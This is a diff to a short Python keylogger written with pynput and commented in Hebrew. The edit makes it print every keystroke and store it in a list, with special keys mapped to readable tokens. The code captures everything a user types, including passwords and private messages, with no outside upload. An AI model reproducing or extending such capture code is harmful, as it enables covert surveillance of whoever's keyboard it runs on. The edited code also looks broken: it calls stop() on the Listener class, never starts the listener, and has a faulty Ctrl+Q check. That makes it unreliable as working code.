@@ -10,20 +10,19 @@ from pynput.keyboard import Key, KeyCode, Listener
 
 #מילון מקשים מיוחדים
 special_keys = {
-#    'Key.space': ' ',
-#    'Key.enter': '\n',
-#    'Key.up': '',
-#    'Key.right': ' ',
-#    'Key.left': '',
-#    'Key.down': '\n',
-#    'Key.ctrl_l': '<ctrl >',
-#    '\\x03': '<copy >',
-#    'Key.backspace': '',
-#    '\\x18': '<cut >',
-#    '\\x16': '<paste >'
-#
+   'Key.space': ' ',
+   'Key.enter': '\n',
+   'Key.up': '',
+   'Key.right': ' ',
+   'Key.left': '',
+   'Key.down': '\n',
+   'Key.ctrl_l': '<ctrl >',
+   '\\x03': '<copy >',
+   'Key.backspace': '',
+   '\\x18': '<cut >',
+   '\\x16': '<paste >'
 }
-
+logged_keys=[]
 #הגדרת סט שמכיל תמיד רק הקשה אחרונה
 pressed_keys = set()
 
@@ -34,7 +33,7 @@ def on_press(key):
     # בדיקה: אם קטרול וקיו נלחצים-לעצירה
     if Key.ctrl_l in pressed_keys and (KeyCode.from_char('q') or KeyCode.from_char('/')) in pressed_keys:
         # print("Ctrl + Q pressed - stop listener")
-        listener.stop()
+        Listener.stop()
 
 
     #  "ניקוי,וסידור": הפלט כמפורט להלן:
@@ -44,11 +43,11 @@ def on_press(key):
         key = f'{key} '  # מוסיף רווח קדמי
 
     #יצוא ההקשות!
-    return key
+    print(key)
+    logged_keys.append (key)
 
 
 def on_release(key):
     pressed_keys.discard(key) # הסרה מהסט-בשחרור
 
-with Listener(on_press=on_press, on_release=on_release) as listener:
-    listener.join()
+Listener= Listener(on_press=on_press, on_release=on_release)
